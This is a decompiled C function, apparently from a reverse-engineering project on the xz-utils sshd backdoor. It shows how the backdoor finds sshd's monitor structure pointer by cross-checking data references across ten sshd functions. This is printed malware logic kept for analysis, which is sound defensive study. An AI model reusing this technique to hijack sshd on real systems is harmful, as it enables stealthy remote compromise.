// /home/kali/xzre-ghidra/xzregh/103DB0_sshd_find_monitor_struct.c
// Function: sshd_find_monitor_struct @ 0x103DB0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_find_monitor_struct(elf_info_t * elf, string_references_t * refs, global_context_t * ctx)


BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_context_t *ctx)

{
  u8 *code_start;
  BOOL BVar1;
  u8 *data_start;
  u8 *data_end;
  ulong uVar2;
  uint uVar3;
  long lVar4;
  ulong uVar5;
  long lVar6;
  void **ppvVar7;
  uint *puVar8;
  byte bVar9;
  u64 local_d0;
  uint local_c8 [20];
  void *local_78 [10];
  
  bVar9 = 0;
  BVar1 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xda,0x14,0xf,0);
  if ((BVar1 != 0) && (local_d0 = 0, ctx->sshd_ctx->mm_request_send_start != (void *)0x0)) {
    ctx->struct_monitor_ptr_address = (monitor **)0x0;
    data_start = (u8 *)elf_get_data_segment(elf,&local_d0,0);
    if (data_start != (u8 *)0x0) {
      lVar6 = 0;
      data_end = data_start + local_d0;
      local_c8[0] = 4;
      local_c8[1] = 5;
      local_c8[2] = 6;
      local_c8[3] = 7;
      local_c8[4] = 8;
      local_c8[5] = 9;
      local_c8[6] = 10;
      local_c8[7] = 0xb;
      local_c8[8] = 0xc;
      local_c8[9] = 0xd;
      ppvVar7 = local_78;
      for (lVar4 = 0x14; lVar4 != 0; lVar4 = lVar4 + -1) {
        *(undefined4 *)ppvVar7 = 0;
        ppvVar7 = (void **)((long)ppvVar7 + (ulong)bVar9 * -8 + 4);
      }
      do {
        code_start = (u8 *)refs->entries[local_c8[lVar6]].func_start;
        if (code_start != (u8 *)0x0) {
          sshd_find_monitor_field_addr_in_function
                    (code_start,(u8 *)refs->entries[local_c8[lVar6]].func_end,data_start,data_end,
                     local_78 + lVar6,ctx);
        }
        lVar6 = lVar6 + 1;
      } while (lVar6 != 10);
      puVar8 = local_c8 + 10;
      for (lVar4 = 10; lVar4 != 0; lVar4 = lVar4 + -1) {
        *puVar8 = 0;
        puVar8 = puVar8 + (ulong)bVar9 * -2 + 1;
      }
      lVar4 = 0;
      do {
        uVar2 = 0;
        do {
          uVar5 = uVar2 & 0xffffffff;
          if ((uint)lVar4 <= (uint)uVar2) {
            local_c8[lVar4 + 10] = local_c8[lVar4 + 10] + 1;
            goto LAB_00103f07;
          }
          ppvVar7 = local_78 + uVar2;
          uVar2 = uVar2 + 1;
        } while (*ppvVar7 != local_78[lVar4]);
        local_c8[uVar5 + 10] = local_c8[uVar5 + 10] + 1;
LAB_00103f07:
        lVar4 = lVar4 + 1;
      } while (lVar4 != 10);
      uVar2 = 0;
      uVar5 = 0;
      uVar3 = 0;
      do {
        if (uVar3 < local_c8[uVar2 + 10]) {
          uVar5 = uVar2 & 0xffffffff;
          uVar3 = local_c8[uVar2 + 10];
        }
        uVar2 = uVar2 + 1;
      } while (uVar2 != 10);
      if ((4 < uVar3) && ((monitor **)local_78[uVar5] != (monitor **)0x0)) {
        ctx->struct_monitor_ptr_address = (monitor **)local_78[uVar5];
        return 1;
      }
    }
  }
  return 0;
}

